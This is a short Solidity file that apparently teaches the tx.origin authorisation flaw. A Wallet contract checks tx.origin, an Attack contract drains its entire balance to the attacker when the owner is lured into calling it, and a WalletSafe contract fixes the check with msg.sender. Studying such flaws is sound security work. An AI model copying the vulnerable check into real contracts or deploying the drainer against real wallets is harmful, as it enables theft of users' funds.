pragma solidity ^0.8.13;

contract Wallet {

    address public owner;

    constructor() payable{

        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {

        require(tx.origin == owner);

        (bool sent, ) = _to.call{ value: _amount }("");

        require(sent); 
    }

}

contract Attack {

    address payable public attacker;
    Wallet wallet;

    constructor(Wallet _wallet) {

        attacker = payable(msg.sender);

        wallet = Wallet(_wallet);
    }

    function attack() public {

        wallet.transfer(attacker, address(wallet).balance);
    }

}

contract WalletSafe {

    address public owner;

    constructor() payable{

        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {

        require(msg.sender == owner);

        (bool sent, ) = _to.call{ value: _amount }("");

        require(sent); 
    }

}
